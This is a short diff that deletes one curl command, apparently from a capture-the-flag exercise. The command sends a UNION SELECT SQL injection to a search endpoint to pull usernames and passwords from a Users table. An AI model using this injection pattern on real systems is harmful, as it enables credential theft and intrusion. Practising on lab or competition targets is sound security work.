@@ -1,2 +1,0 @@
-curl 'http://web1.cybercastors.com:14435/search?id=3%20UNION%20SELECT%201,%202,%203,%20Username,%20Password%20FROM%20Users;' -H 'Cookie: client=3123248' --data-raw --compressed --insecure
-
